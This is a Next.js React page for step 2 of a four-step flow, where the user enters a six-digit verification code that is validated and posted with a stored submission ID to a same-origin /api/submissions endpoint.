
'use client';

import { zodResolver } from '@hookform/resolvers/zod';
import { KeyRound, Loader2 } from 'lucide-react';
import { useRouter } from 'next/navigation';
import { useForm } from 'react-hook-form';
import * as z from 'zod';

import { Button } from '@/components/ui/button';
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from '@/components/ui/card';
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
import { InputOTP, InputOTPGroup, InputOTPSlot } from '@/components/ui/input-otp';
import { Progress } from '@/components/ui/progress';
import { useMockUser } from '@/hooks/use-mock-user';
import { useEffect } from 'react';


const formSchema = z.object({
  verificationCode: z.string().length(6, "Code must be 6 digits."),
});

type FormValues = z.infer<typeof formSchema>;

export default function VerifyCodePage() {
  const router = useRouter();
  const { user, isLoading: isUserLoading } = useMockUser();

  const form = useForm<FormValues>({
    resolver: zodResolver(formSchema),
    mode: 'onChange',
    defaultValues: {
      verificationCode: "",
    }
  });

  useEffect(() => {
    // Redirect if user is not "logged in" or if there's no submission ID
    if (!isUserLoading && !user) {
        router.replace('/start');
    }
    const submissionId = localStorage.getItem('submissionId');
    if (!submissionId) {
        router.replace('/start/username');
    }
  }, [user, isUserLoading, router]);

  const onSubmit = async (values: FormValues) => {
    const submissionId = localStorage.getItem('submissionId');
     if (!user || !submissionId) {
      form.setError("root", { message: "You must be logged in to proceed." });
      return;
    }
    
    try {
      const response = await fetch('/api/submissions', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          id: submissionId,
          verificationCode: values.verificationCode,
        }),
      });

      if (!response.ok) {
        const errorData = await response.json();
        throw new Error(errorData.message || 'An unknown error occurred.');
      }

      router.push('/start/select-number');

    } catch (error: any) {
      console.error(error);
      form.setError("root", { message: error.message || "An unexpected error occurred." });
    }
  };

  const autoSubmitCode = (code: string) => {
    if (code.length === 6) {
      form.handleSubmit(onSubmit)();
    }
  };

  const isSubmitting = form.formState.isSubmitting;

  if (isUserLoading) {
    return (
        <div className="flex min-h-screen items-center justify-center">
            <Loader2 className="h-8 w-8 animate-spin" />
            <p className="ml-4 text-muted-foreground">Loading Your Progress...</p>
        </div>
    )
  }

  return (
    <Card className="w-full max-w-md">
      <CardHeader>
        <Progress value={50} className="mb-4 h-1.5" />
        <div className="flex items-center space-x-4 min-h-[48px]">
          <div className="flex h-10 w-10 items-center justify-center rounded-full bg-primary text-primary-foreground shrink-0">
            <KeyRound className="h-6 w-6" />
          </div>
          <div>
            <CardTitle className="text-xl">Enter Code</CardTitle>
            <CardDescription>Step 2 of 4</CardDescription>
          </div>
        </div>
      </CardHeader>
      <Form {...form}>
        <form onSubmit={form.handleSubmit(onSubmit)}>
          <CardContent className="min-h-[200px] flex items-center justify-center">
             {form.formState.errors.root && (
                <div className="text-destructive text-sm font-medium p-2 text-center">{form.formState.errors.root.message}</div>
            )}
            <FormField
              control={form.control}
              name="verificationCode"
              render={({ field }) => (
                <FormItem className="flex flex-col items-center">
                  <FormLabel>Verification Code</FormLabel>
                  <FormControl>
                    <InputOTP maxLength={6} {...field} onComplete={autoSubmitCode}>
                      <InputOTPGroup>
                        <InputOTPSlot index={0} />
                        <InputOTPSlot index={1} />
                        <InputOTPSlot index={2} />
                        <InputOTPSlot index={3} />
                        <InputOTPSlot index={4} />
                        <InputOTPSlot index={5} />
                      </InputOTPGroup>
                    </InputOTP>
                  </FormControl>
                  <p className="text-sm text-muted-foreground pt-2 text-center max-w-xs">Enter the 6-digit code sent to your device.</p>
                  <FormMessage />
                </FormItem>
              )}
            />
          </CardContent>
          <CardFooter className="flex-col-reverse gap-4 pt-4">
            <Button type="submit" disabled={isSubmitting} className="w-full rounded-full" size="lg">
              {isSubmitting ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : null}
              Continue
            </Button>
            <Button type="button" variant="ghost" onClick={() => router.back()} disabled={isSubmitting} className="w-full rounded-full">Back</Button>
          </CardFooter>
        </form>
      </Form>
    </Card>
  );
}
